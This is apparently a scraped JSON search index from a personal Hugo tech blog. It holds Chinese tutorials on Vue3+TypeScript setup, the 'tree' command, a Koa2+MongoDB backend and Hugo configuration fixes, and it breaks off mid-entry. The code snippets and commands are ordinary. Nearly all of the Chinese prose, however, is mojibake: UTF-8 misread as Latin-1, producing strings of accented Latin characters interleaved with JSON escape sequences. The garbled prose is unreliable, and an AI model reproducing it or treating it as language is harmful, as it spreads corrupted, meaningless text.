å‘½ä»¤ä»¥å›¾å½¢åŒ–ç•Œé¢åˆ›å»ºå’Œç®¡ç†é¡¹ç›®\n// åˆ›å»º \u0026amp; é€‰æ‹©è‡ªå®šä¹‰æ¨¡æ¿ã€æ’ä»¶ç­‰ vue create vue3-ts å¯ä»¥é€‰æ‹©é»˜è®¤è®¾ç½®æˆ–è€…æ‰‹åŠ¨é€‰æ‹©ç‰¹æ€§ï¼ˆè¿™é‡Œé€‰æ‹©æ‰‹åŠ¨é€‰æ‹©ç‰¹æ€§ï¼‰ã€‚\né»˜è®¤è®¾ç½® é»˜è®¤çš„è®¾ç½®éå¸¸é€‚åˆå¿«é€Ÿåˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®çš„åŸå‹ï¼Œè€Œæ‰‹åŠ¨è®¾ç½®åˆ™æä¾›äº†æ›´å¤šçš„é€‰é¡¹ï¼Œå®ƒä»¬æ˜¯é¢å‘ç”Ÿäº§çš„é¡¹ç›®æ›´åŠ éœ€è¦çš„ 3ã€è¿›å…¥vue3-tsï¼Œå®‰è£…ä¾èµ– ts vuex vue-router vue3-lazy stylus // å®‰è£… tsï¼Œä¼šæç¤ºä½ é€‰æ‹© babelã€stylesç­‰æ’ä»¶ cd vue3-ts vue add typescript vue add vuex vue add router npm install vue3-lazy -S npm install stylus stylus-loader --save-dev å››ã€é¡¹ç›®ç»“æ„ â”œâ”€â”€ README.md â”œâ”€â”€ babel.config.js â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â”œâ”€â”€ public â”‚ â”œâ”€â”€ favicon.ico â”‚ â””â”€â”€ index.html â”œâ”€â”€ src â”‚ â”œâ”€â”€ App.vue â”‚ â”œâ”€â”€ assets â”‚ â”‚ â”œâ”€â”€ logo.png â”‚ â”‚ â””â”€â”€ styles â”‚ â”‚ â””â”€â”€ varible.styl â”‚ â”œâ”€â”€ components â”‚ â”‚ â”œâ”€â”€ HeaderNav.vue â”‚ â”‚ â””â”€â”€ HelloWorld.vue â”‚ â”œâ”€â”€ main.ts â”‚ â”œâ”€â”€ router â”‚ â”‚ â””â”€â”€ index.ts â”‚ â”œâ”€â”€ shims-vue.d.ts â”‚ â”œâ”€â”€ store â”‚ â”‚ â””â”€â”€ index.ts â”‚ â”œâ”€â”€ types â”‚ â”‚ â””â”€â”€ movie.ts â”‚ â””â”€â”€ views â”‚ â”œâ”€â”€ About.vue â”‚ â”œâ”€â”€ Detail.vue â”‚ â”œâ”€â”€ Home.vue â”‚ â”œâ”€â”€ List.vue â”‚ â””â”€â”€ components â”‚ â”œâ”€â”€ ListItem.vue â”‚ â””â”€â”€ TestInject.vue â””â”€â”€ tsconfig.json äº”ã€æºç  exampleæºç åœ°å€: vue3-ts\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/10.vue3%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/","summary":"\u003cp\u003eæœ¬æ–‡æ˜¯vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬1ç¯‡ã€Švue3é¡¹ç›®ä»0åˆ°1æ­å»ºã€‹ï¼Œä¸»è¦æ¶‰åŠåˆ°\u0026hellip;\u003c/p\u003e","title":"vue3+ts(1)ï¼švue3é¡¹ç›®ä»0åˆ°1æ­å»º"},{"content":"è¾“å‡ºä¼˜ç¾çš„ç›®å½•ç»“æ„ä»…ä»…åªéœ€è¦\u0026hellip;\nä¸€ã€å®‰è£… \u0026amp; ä½¿ç”¨ i.å®‰è£…\nMac OS # å®‰è£… brew install tree Debianï¼ˆLinuxï¼‰ $ sudo apt-get update # å»ºè®®æ¯æ¬¡å®‰è£…å‰è¿è¡Œè¯¥å‘½ä»¤ï¼Œå¯å¾—åˆ°åœ¨çº¿è½¯ä»¶åº“ä¸­è½¯ä»¶çš„æœ€æ–°ç‰ˆæœ¬ $ sudo apt-get install tree $ tree --version # å‚è€ƒï¼šhttps://blog.csdn.net/oMcLin/article/details/108374673 ii.ä½¿ç”¨\n# è¾“å‡º: æŸæ–‡ä»¶ä¸‹æ‰§è¡Œ $ tree äºŒã€å¸¸ç”¨å‘½ä»¤ æ³¨æ„å¤§å°å†™\n# æŸ¥çœ‹æ›´å¤šå‘½ä»¤ tree --help # åªæ˜¾ç¤ºæ–‡ä»¶å¤¹ tree -d # è¦æ˜¾ç¤ºé¡¹ç›®çš„å±‚çº§ã€‚nä¸ºå±‚çº§æ•° tree -L n # ä¾‹: æ˜¾ç¤ºæ¯ä¸ªç›®å½•å¾€ä¸‹ä¸¤çº§ tree -L 2 # è¿‡æ»¤ä¸æƒ³æ˜¾ç¤ºçš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ tree -I pattern # ä¾‹: è¿‡æ»¤nodeä¾èµ–è¿˜æœ‰srcæ–‡ä»¶å¤¹ tree -I \u0026#39;node_modules|src\u0026#39; # é¡¹ç›®ç»“æ„è¾“å‡ºåˆ° tree.txt æ–‡ä»¶ tree \u0026gt; tree.txt ä¸‰ã€å…¨éƒ¨å‘½ä»¤ -d æ˜¾ç¤ºç›®å½•åç§°è€Œéå†…å®¹ã€‚ -D åˆ—å‡ºæ–‡ä»¶æˆ–ç›®å½•çš„æ›´æ”¹æ—¶é—´ã€‚ -f åœ¨æ¯ä¸ªæ–‡ä»¶æˆ–ç›®å½•ä¹‹å‰ï¼Œæ˜¾ç¤ºå®Œæ•´çš„ç›¸å¯¹è·¯å¾„åç§°ã€‚ -F åœ¨æ‰§è¡Œæ–‡ä»¶ï¼Œç›®å½•ï¼ŒSocketï¼Œç¬¦å·è¿æ¥ï¼Œç®¡é“åç§°åç§°ï¼Œå„è‡ªåŠ ä¸Š\u0026quot;*\u0026quot;,\u0026quot;/\u0026quot;,\u0026quot;=\u0026quot;,\u0026quot;@\u0026quot;,\u0026quot;|\u0026ldquo;å·ã€‚ -g åˆ—å‡ºæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ç¾¤ç»„åç§°ï¼Œæ²¡æœ‰å¯¹åº”çš„åç§°æ—¶ï¼Œåˆ™æ˜¾ç¤ºç¾¤ç»„è¯†åˆ«ç ã€‚ -i ä¸ä»¥é˜¶æ¢¯çŠ¶åˆ—å‡ºæ–‡ä»¶æˆ–ç›®å½•åç§°ã€‚ -I\u0026lt;èŒƒæœ¬æ ·å¼\u0026gt; ä¸æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„æ–‡ä»¶æˆ–ç›®å½•åç§°ã€‚ -l å¦‚é‡åˆ°æ€§è´¨ä¸ºç¬¦å·è¿æ¥çš„ç›®å½•ï¼Œç›´æ¥åˆ—å‡ºè¯¥è¿æ¥æ‰€æŒ‡å‘çš„åŸå§‹ç›®å½•ã€‚ -n ä¸åœ¨æ–‡ä»¶å’Œç›®å½•æ¸…å•åŠ ä¸Šè‰²å½©ã€‚ -N ç›´æ¥åˆ—å‡ºæ–‡ä»¶å’Œç›®å½•åç§°ï¼ŒåŒ…æ‹¬æ§åˆ¶å­—ç¬¦ã€‚ -p åˆ—å‡ºæƒé™æ ‡ç¤ºã€‚ -P\u0026lt;èŒƒæœ¬æ ·å¼\u0026gt; åªæ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„æ–‡ä»¶æˆ–ç›®å½•åç§°ã€‚ -q ç”¨\u0026rdquo;?\u0026ldquo;å·å–ä»£æ§åˆ¶å­—ç¬¦ï¼Œåˆ—å‡ºæ–‡ä»¶å’Œç›®å½•åç§°ã€‚ -s åˆ—å‡ºæ–‡ä»¶æˆ–ç›®å½•å¤§å°ã€‚ -t ç”¨æ–‡ä»¶å’Œç›®å½•çš„æ›´æ”¹æ—¶é—´æ’åºã€‚ -u åˆ—å‡ºæ–‡ä»¶æˆ–ç›®å½•çš„æ‹¥æœ‰è€…åç§°ï¼Œæ²¡æœ‰å¯¹åº”çš„åç§°æ—¶ï¼Œåˆ™æ˜¾ç¤ºç”¨æˆ·è¯†åˆ«ç ã€‚ -x å°†èŒƒå›´å±€é™åœ¨ç°è¡Œçš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œè‹¥æŒ‡å®šç›®å½•ä¸‹çš„æŸäº›å­ç›®å½•ï¼Œå…¶å­˜æ”¾äºå¦ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šï¼Œåˆ™å°†è¯¥å­ç›®å½•äºˆä»¥æ’é™¤åœ¨å¯»æ‰¾èŒƒå›´å¤–ã€‚ å››ã€ç¤ºä¾‹ â”œâ”€â”€ app â”‚ â”œâ”€â”€ controller â”‚ â”‚ â””â”€â”€ user.js â”‚ â”œâ”€â”€ dbHelper â”‚ â”‚ â””â”€â”€ user.js â”‚ â””â”€â”€ router.js â”œâ”€â”€ app.js â”œâ”€â”€ configs â”‚ â””â”€â”€ cors.js â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â””â”€â”€ start.js èœé¸Ÿæ–‡æ¡£\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/tree-generate-project-directory/","summary":"\u003cp\u003eè¾“å‡ºä¼˜ç¾çš„ç›®å½•ç»“æ„ä»…ä»…åªéœ€è¦\u0026hellip;\u003c/p\u003e","title":"å·¥å…·: Treeç”Ÿæˆ\"é¡¹ç›®ç›®å½•\"æ ‘å½¢ç»“æ„"},{"content":"è‡ªå·±æ­å»ºé¡¹ç›®è®©æˆ‘ä»¬ä¸ä»…ä»…å…³æ³¨äºå¼€å‘æœ¬èº«ï¼ŒçŸ¥å…¶ç„¶çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œæ”¶è·æ›´å¤š\u0026hellip;\nä¸€ã€å‰è¨€ è™½ç„¶ï¼Œå¯¹äºæ–°æ‰‹æ¥è¯´ï¼Œæˆ‘ä»¬é€‰æ‹©ç±»ä¼¼äºkoa-generatorä¹‹ç±»çš„è„šæ‰‹æ¶ï¼Œå¯ä»¥æœ€å¿«çš„å…¥æ‰‹koa2æˆ–è€…nodeé¡¹ç›®ã€‚ä½†æ˜¯ï¼Œè‡ªå·±æ­å»ºé¡¹ç›®ï¼Œæ›´åŠ é€‚ç”¨äºå®é™…å¼€å‘ä¸­å‰åç«¯åˆ†ç¦»çš„å®šåˆ¶åŒ–ä¸šåŠ¡åœºæ™¯ï¼Œä¸”èƒ½è®©æˆ‘ä»¬ä¸ä»…ä»…å…³æ³¨äºå¼€å‘æœ¬èº«ï¼ŒçŸ¥å…¶ç„¶çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œæ”¶è·æ›´å¤šçš„ä¸œè¥¿ã€‚\nåœ¨å…¨å±€ä¸­å®‰è£…koaä¾èµ–åŒ… (ä¿æŒé¡¹ç›®ç‰ˆæœ¬çš„ç»Ÿä¸€æ€§)æˆ–åœ¨æœ¬åœ°é¡¹ç›®ä¸­å®‰è£…\nnpm install -g koa npm install koa --save äºŒã€åˆ›å»ºé¡¹ç›® \u0026amp; å®‰è£…ä¾èµ– 1ã€åˆ›å»ºæ–‡ä»¶ä¸”åˆå§‹åŒ–é¡¹ç›® npm init 2ã€å®‰è£…ä¾èµ– // è·¯ç”± npm install koa-router koa-bodyparser --save // çƒ­é‡å¯ npm install nodemon --save // æ”¯æŒimportæ¨¡å—çš„å¼•å…¥ npm install babel-plugin-transform-es2015-modules-commonjs babel-register --save // mongodb npm install mongoose --save // è§£å†³è·¨åŸŸé—®é¢˜ npm install koa2-cors --save ä¸‰ã€é…ç½® 1ã€åŸºç¡€é…ç½® æœ€åŸºæœ¬çš„å¼€å‘ç¯å¢ƒå·²æ­å»ºå®Œï¼Œå¼€å¯serviceç›‘å¬3000ç«¯å£:\nå¯¹äºä»»ä½•è¯·æ±‚ï¼Œappå°†è°ƒç”¨å¼‚æ­¥å‡½æ•°app.use(async (ctx, next) =\u0026gt; {})å¤„ç†è¯·æ±‚ï¼Œåªæœ‰å½“next()ä¹‹åæ‰èƒ½æ‰§è¡Œä¸‹ä¸€ä¸ªapp.use()\nconst Koa = require(\u0026#39;koa\u0026#39;) const app = new Koa({ // ä»£ç† // proxy: true }); // logger app.use(async (ctx, next) =\u0026gt; { console.log(\u0026#39;--0-0--\u0026#39;) await next(); const rt = ctx.response.get(\u0026#39;X-Response-Time\u0026#39;) console.log(`--0-1-- ${ctx.method} ${ctx.url} - ${rt}`) }) // x-response-time app.use(async (ctx, next) =\u0026gt; { console.log(\u0026#39;--1-0--\u0026#39;) const start = new Date() await next() const ms = Date.now() - start; console.log(\u0026#39;--1-1--\u0026#39;) ctx.set(\u0026#39;X-Response-Time\u0026#39;, `${ms}ms`); }) // response app.use(async ctx =\u0026gt; { ctx.body = \u0026#39;Hello World, Koa!\u0026#39; }) app.listen(3000) 2ã€é…ç½®è·¯ç”± const Koa = require(\u0026#39;koa\u0026#39;); const bodyParser = require(\u0026#39;koa-bodyparser\u0026#39;); const app = new Koa(); app.use(bodyParser()); // è§£ærequestçš„body const router = require(\u0026#39;koa-router\u0026#39;)() router.get(\u0026#39;/\u0026#39;, async (ctx, next) =\u0026gt; { // todo }) app.use(router.routes()); app.listen(3000); console.log(\u0026#39;app started at port 3000...\u0026#39;) å¯ç›´æ¥è®¿é—®ç«¯å£3000ï¼Œè‹¥é’ˆå¯¹BFFå±‚å¼€å‘èšåˆæ¥å£ï¼Œå¯å¢åŠ apiå‰ç¼€æ ‡è¯†\nconst Router = require(\u0026#39;koa-router\u0026#39;) const router = new Router({ prefix: \u0026#39;/api\u0026#39; }) æ­¤æ—¶è®¿é—®åœ°å€å˜ä¸ºï¼šhttp://localhost:3000/api\n3ã€çƒ­é‡å¯å¤„ç† å¯¹æ ‡webpacké¡¹ç›®ä¸­çš„çƒ­æ›´æ–°ï¼Œä»£ç çš„ä¿®æ”¹ï¼Œä¸å¿…é‡æ–°npm run startå¯åŠ¨é¡¹ç›®å°±å¯ä»¥å®æ—¶çš„çœ‹åˆ°æ•ˆæœã€‚å¯¹äºnodeé¡¹ç›®çš„ç®¡ç†ï¼Œå½“ç„¶ä¹Ÿæœ‰ç±»ä¼¼çš„å·¥å…·ï¼šnodemon\nNodemonï¼Œç”¨äºç›‘è§†æºä¸­çš„ä»»ä½•æ›´æ”¹å¹¶è‡ªåŠ¨é‡æ–°å¯åŠ¨æœåŠ¡å™¨ã€‚æ”¯æŒè‡ªå®šä¹‰é…ç½®nodemon.jsonä½¿ç”¨\næ›´æ”¹package.jsonï¼Œæ‰§è¡Œ npm run startï¼Œè¾¾åˆ°äº†çƒ­é‡å¯çš„æ•ˆæœ\n// package.json \u0026#34;scripts\u0026#34;: { ... \u0026#34;start\u0026#34;: \u0026#34;nodemon app.js\u0026#34; }, 4ã€node æ”¯æŒ importæ¨¡å—å¼•å…¥ï¼ˆå¯å¿½ç•¥ï¼‰ åŸç”Ÿçš„ node ä¸æ”¯æŒimportå¼•å…¥æ¨¡å—ï¼Œæ‰€ä»¥é¡¹ç›®ä¸­å¼ºè¡Œä½¿ç”¨importæ–¹å¼å¼•å…¥ï¼Œä¼šæŠ›å‡ºç±»ä¼¼æŠ¥é”™ä¿¡æ¯: SyntaxError: Unexpected token import\nè§£å†³æ–¹æ¡ˆæ¶‰åŠæŒ‰å¦‚ä¸‹å‡ ä¸ªæ–¹é¢ï¼š\nå®‰è£… babel ä¾èµ– æ ¹ç›®å½•ä¸‹åˆ›å»º start.js æ›´æ”¹ package.json å®‰è£…å¦‚ä¸‹ä¾èµ– npm install babel-plugin-transform-es2015-modules-commonjs babel-register --save æ ¹ç›®å½•ä¸‹åˆ›å»ºstart.js require(\u0026#39;babel-register\u0026#39;) ( { plugins: [\u0026#39;babel-plugin-transform-es2015-modules-commonjs\u0026#39;], } ) module.exports = require(\u0026#39;./app.js\u0026#39;) æ›´æ”¹ package.json \u0026#34;scripts\u0026#34;: { ... \u0026#34;start\u0026#34;: \u0026#34;nodemon star.js\u0026#34; } å®Œæˆä»¥ä¸Šä¸‰ä¸ªæ­¥éª¤ï¼Œåœ¨app.jså†…ä½¿ç”¨importè¯­æ³•ï¼Œè¿è¡Œ npm startï¼Œåˆšæ‰æŠ¥é”™ä¿¡æ¯æ¶ˆå¤±\n5ã€è¿æ¥æ•°æ®åº“ å®‰è£…ï¼šnpm install mongoose --save å¯åŠ¨: mongod è§†å›¾ç®¡ç†: MongoDB Compass a. æ­å»ºå¦‚ä¸‹æ•°æ®åº“ï¼š b. æŸ¥è¯¢è¯­å¥ // æ–‡ä»¶è·¯å¾„: app/dbHelper/user.js const MongoClient = require(\u0026#39;mongodb\u0026#39;).MongoClient; const assert = require(\u0026#39;assert\u0026#39;); // mongoDB const dbUrl = \u0026#34;mongodb://localhost:27017/testLocal\u0026#34;; const client = new MongoClient(dbUrl, {useNewUrlParser: true}); const dbName = \u0026#39;testLocal\u0026#39; const tableName = \u0026#39;user\u0026#39; /** * @desc: æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ· */ exports.queryUsers = function() { return new Promise(function (resolve, reject) { try { client.connect(function(err) { assert.equal(null, err); const db = client.db(dbName); const collection = db.collection(tableName); collection.find({}).toArray(function(err, result) { assert.equal(err, null); // console.log(\u0026#39;--db-1-result--\u0026#39;, result) client.close(); resolve(result) }); }) } catch(e) { reject(e) } }) } c. è¿è¡Œç¨‹åºæŸ¥çœ‹ç»“æœ æ•°æ®æŸ¥è¯¢ç»“æœï¼š è§†å›¾ç»“æœï¼š\nåˆ°æ­¤ä¸ºæ­¢ï¼Œèšä¸ªBFFå±‚æ¥å£åŠŸèƒ½çš„é¡¹ç›®ç»“æ„åŸºæœ¬å°±æ»¡è¶³äº†ã€‚\n6ã€è§£å†³è·¨åŸŸ å¯¹äºæ¥å£è·¨åŸŸï¼Œè§£å†³çš„åŠæ³•æœ‰å¾ˆå¤šï¼Œjsonpã€crosã€Nginxä»£ç†ã€nodeä»£ç†ç­‰ã€‚è¿™é‡Œåªä»‹ç»crosæ–¹æ¡ˆï¼škoa2-cors\nå…¥å£æ–‡ä»¶\n// app.js å¼•å…¥ const cors = require(\u0026#39;koa2-cors\u0026#39;) const app = new Koa() import corsConfigs from \u0026#39;./configs/cors\u0026#39; // å¤„ç†è·¨åŸŸçš„é…ç½® app.use(cors(corsConfigs)); é…ç½®æ–‡ä»¶\n// config/cors.js /** * @desc: è·¨åŸŸå¤„ç†é…ç½®é¡¹ * @author: lianpf * @date: 2021-02-24 * */ const corsConfigs = { exposeHeaders: [\u0026#39;WWW-Authenticate\u0026#39;, \u0026#39;Server-Authorization\u0026#39;, \u0026#39;Date\u0026#39;], maxAge: 100, credentials: true, allowMethods: [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;, \u0026#39;OPTIONS\u0026#39;], allowHeaders: [\u0026#39;Content-Type\u0026#39;, \u0026#39;Authorization\u0026#39;, \u0026#39;Accept\u0026#39;, \u0026#39;X-Custom-Header\u0026#39;, \u0026#39;anonymous\u0026#39;], } export default corsConfigs å››ã€TS \u0026amp; ESLint å¾…è¡¥å……\u0026hellip;\nå¯æ”¶è— æ›œçµï¼ˆSUNï¼‰SITE ğŸŒï¼ŒåŠæ—¶è·å–æ–‡ç« æ›´æ–°ä¿¡æ¯\näº”ã€Project ç»“æ„å›¾ â”œâ”€â”€ app â”‚ â”œâ”€â”€ controller â”‚ â”‚ â””â”€â”€ user.js â”‚ â”œâ”€â”€ dbHelper â”‚ â”‚ â””â”€â”€ user.js â”‚ â””â”€â”€ router.js â”œâ”€â”€ app.js â”œâ”€â”€ configs â”‚ â””â”€â”€ cors.js â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â””â”€â”€ start.js æºç å‚è€ƒ gitHubä»“åº“: https://github.com/lianpf/examples/tree/master/node/koa2-mongodb\nå…³é”®æ–‡ä»¶ app.js\n/** * @desc: å…¥å£æ–‡ä»¶ * @author: lianpf * @date: 2021-02-24 * */ const Koa = require(\u0026#39;koa\u0026#39;); const bodyParser = require(\u0026#39;koa-bodyparser\u0026#39;) const cors = require(\u0026#39;koa2-cors\u0026#39;) const app = new Koa() import router from \u0026#39;./app/router\u0026#39; import corsConfigs from \u0026#39;./configs/cors\u0026#39; // å¤„ç†è·¨åŸŸçš„é…ç½® app.use(cors(corsConfigs)); // logger ä¸­é—´ä»¶ // const loggerAsync = require(\u0026#39;./middleware/logger-async\u0026#39;) // app.use(loggerAsync()) // router app.use(bodyParser()); // è§£ærequestçš„body app.use(router.routes()); // response // app.use(async ctx =\u0026gt; { // ctx.body = \u0026#39;Hello World, Koa!\u0026#39; // }) // åœ¨ç«¯å£3000ç›‘å¬: app.listen(3000); console.log(\u0026#39;app started at port 3000...\u0026#39;) package.json\n{ \u0026#34;name\u0026#34;: \u0026#34;koa2-ts-mongodb\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;koa2-mongodb-ts demo\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;app.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34;, \u0026#34;start\u0026#34;: \u0026#34;nodemon start.js\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;babel-plugin-transform-es2015-modules-commonjs\u0026#34;: \u0026#34;^6.26.2\u0026#34;, \u0026#34;babel-register\u0026#34;: \u0026#34;^6.26.0\u0026#34;, \u0026#34;koa\u0026#34;: \u0026#34;^2.13.1\u0026#34;, \u0026#34;koa-bodyparser\u0026#34;: \u0026#34;^4.3.0\u0026#34;, \u0026#34;koa-router\u0026#34;: \u0026#34;^10.0.0\u0026#34;, \u0026#34;koa2-cors\u0026#34;: \u0026#34;^2.0.6\u0026#34;, \u0026#34;mongoose\u0026#34;: \u0026#34;^5.11.18\u0026#34;, \u0026#34;nodemon\u0026#34;: \u0026#34;^2.0.7\u0026#34; }, \u0026#34;devDependencies\u0026#34;: { \u0026#34;@types/koa\u0026#34;: \u0026#34;^2.13.0\u0026#34;, \u0026#34;tslint\u0026#34;: \u0026#34;^6.1.3\u0026#34;, \u0026#34;typescript\u0026#34;: \u0026#34;^4.1.5\u0026#34; } } start.js\nrequire(\u0026#39;babel-register\u0026#39;) ( { plugins: [\u0026#39;babel-plugin-transform-es2015-modules-commonjs\u0026#39;], } ) module.exports = require(\u0026#39;./app.js\u0026#39;) app/router.js\nconst router = require(\u0026#39;koa-router\u0026#39;)() const User = require(\u0026#39;./controller/user\u0026#39;) router.get(\u0026#39;/\u0026#39;, User.query) export default router æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-koa2-mongodb-buildproject/","summary":"\u003cp\u003eè‡ªå·±æ­å»ºé¡¹ç›®è®©æˆ‘ä»¬ä¸ä»…ä»…å…³æ³¨äºå¼€å‘æœ¬èº«ï¼ŒçŸ¥å…¶ç„¶çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œæ”¶è·æ›´å¤š\u0026hellip;\u003c/p\u003e","title":"Node: Koa2 + Mongodb(ä»0åˆ°1)æ­å»ºé¡¹ç›®"},{"content":"å…³äºä½¿ç”¨hugoæ­å»ºåšå®¢è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°çš„ä¸€äº›å°é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ\u0026hellip;\nå®˜æ–¹ä½¿ç”¨æ–‡æ¡£\nä¸€ã€é…ç½®é¡¹ 1ã€é«˜äº®é—®é¢˜ æ’ä»¶ï¼šhighlight è§£å†³æ–¹æ¡ˆ: å‚è€ƒ å…³é”®æ­¥éª¤\nå°†ä¸‹è½½è§£å‹çš„ highlight æ–‡ä»¶å¤¹æ”¾ç½®äº static/js/ ä¸‹\nhighlight.pack.js å†³å®šé‚£äº›è¯­è¨€çš„ä»£ç ä¼šæ ¹æ®è¯­æ³•è¿›è¡Œé«˜äº® styleæ–‡ä»¶å¤¹ä¸­é€‰æ‹©å–œæ¬¢çš„cssæ ·å¼æ–‡ä»¶ï¼Œcssæ–‡ä»¶å†³å®šä»£ç é«˜äº®çš„é¢œè‰² æœ€åæˆ‘é€‰æ‹©äº† agate.css\nç„¶åéœ€è¦åœ¨\u0026lt;head\u0026gt;ä¸­å¢åŠ ï¼š\n// ä¸»é¢˜å¯æ ¹æ®åˆ—è¡¨é€‰æ‹© - agate \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/js/highlight/styles/agate.css\u0026#34;\u0026gt; åœ¨\u0026lt;body\u0026gt;ç»“æŸå‰å¢åŠ ï¼š\n\u0026lt;script src=\u0026#34;/js/highlight/highlight.pack.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;hljs.initHighlightingOnLoad();\u0026lt;/script\u0026gt; 2ã€èœå•é—®é¢˜ å¢åŠ æƒé‡\n3ã€ç›®å½•(toc)é—®é¢˜ æè¿°ï¼šæœ€æ–°ç‰ˆä¼¼ä¹æœ‰ä¸ªbugï¼šæ–‡ç« ç›®å½•æ— æ³•æ”¯æŒ3çº§æ ‡é¢˜ä»¥ä¸‹çš„æ˜¾ç¤º #240\nHugo (\u0026gt;=0.60.0) uses Goldmark as default renderer. You may add the following settings to your config.toml.\n[markup] [markup.tableOfContents] endLevel = 3 # æœ€å°æ ‡é¢˜ ordered = false startLevel = 2 # æœ€å¤§æ ‡é¢˜ See https://gohugo.io/getting-started/configuration-markup/#table-of-contents\näºŒã€è¯­æ³•é—®é¢˜ 1ã€å®šåˆ¶ head / footer åŸºæœ¬å¸ƒå±€é¡µï¼šlayouts/_default/baseof.html ä¸ªæ€§åŒ–é…ç½®é¡µï¼šlayouts/partials/head.htmlã€layouts/partials/zhihu.svgç­‰ 2ã€é”šç‚¹ï¼šâ€œback to topâ€æŒ‰é’® æ’ä»¶ï¼švanilla-back-to-top ä¸ªæ€§åŒ–é…ç½®é¡µ â€”â€” layouts/partials/footer.htmlé¡µé¢åµŒå…¥å¦‚ä¸‹ä»£ç ï¼š\n\u0026lt;script src=\u0026#34;https://unpkg.com/vanilla-back-to-top@7.1.14/dist/vanilla-back-to-top.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; addBackToTop({ diameter: 56, backgroundColor: \u0026#39;rgb(255, 82, 82)\u0026#39;, textColor: \u0026#39;#fff\u0026#39; }) \u0026lt;/script\u0026gt; 3ã€ç«™å†…æœç´¢ DuckDuckGo search google search å•†ä¸šè§£å†³æ–¹æ¡ˆ Algolia æ‰‹åŠ¨Codingè§£å†³ golang æš´åŠ›è§£æ³• æ‰‹åŠ¨Codingè§£å†³æ ¸å¿ƒæ€æƒ³ (1) æœç´¢æ¡†è§¦å‘ search function\nfunction search () { $.getJSON(baseUrl + \u0026#39;search.json\u0026#39;, function(result){ // æ‹¿åˆ°æœç´¢ç»“æœ }) } (2) search.json\n{ \u0026#34;results\u0026#34;: [ { \u0026#34;url\u0026#34;: \u0026#34;http://example.com/article3/\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Article3\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;word3a word3b word3c\u0026#34; }, { 